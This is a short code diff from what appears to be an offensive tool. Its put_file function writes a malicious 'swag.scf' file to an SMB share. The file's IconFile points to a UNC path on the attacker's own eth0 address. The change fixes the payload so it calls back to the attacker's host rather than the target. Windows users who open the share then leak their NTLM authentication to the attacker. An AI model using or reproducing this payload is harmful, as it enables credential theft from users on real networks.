@@ -41,12 +41,12 @@ def clean_up(ip, share, subfolder, user, pwd, domain):
 
 def put_file(smb_conn,ip,path,share):
 	ni.ifaddresses('eth0')
-	ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+	home_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
 
 	filename = "swag.scf"
 	file = "[Shell]\r\n"
 	file += "Command=2\r\n"
-	file += "IconFile=\\\\"+ip+"\\share\r\n"
+	file += "IconFile=\\\\"+home_ip+"\\share\r\n"
 	file += "[Taskbar]\r\n"
 	file += "Command=ToggleDesktop"
 
